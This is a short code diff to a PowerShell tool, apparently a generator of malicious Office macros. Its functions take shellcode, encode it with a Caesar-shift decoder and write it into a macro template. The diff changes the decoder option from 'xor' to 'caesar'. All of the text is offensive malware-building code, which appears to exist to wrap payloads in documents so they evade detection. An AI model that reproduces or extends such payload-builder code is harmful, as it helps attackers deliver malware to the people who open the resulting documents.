@@ -46,7 +46,7 @@ function Invoke-Vulcan {
 
     [CmdletBinding(PositionalBinding = $False)]
     param(
-        [ValidateSet("xor")]
+        [ValidateSet("caesar")]
         [string]
         $Decoder,
 
@@ -153,7 +153,7 @@ function Create_MacroFromTemplate($CaesarShift, $Decoder, $DecoderPath, $ShellCo
     Write-Debug "Payload array: $PayloadArray"
 
     switch ($Decoder) {
-        "xor" {
+        "caesar" {
             Set-Content -Path $MacroOutput -Value (
                 Get-Content -Path $Template).Replace("PAYLOAD", "Array(" + $PayloadArray + ')' + "`r`n" + "`r`n" + "`t" + "kUG(HoR)")
             Add-Content -Path $MacroOutput -Value ((Get-Content -Path $DecoderPath).Replace("CaesarShift", $CaesarShift))
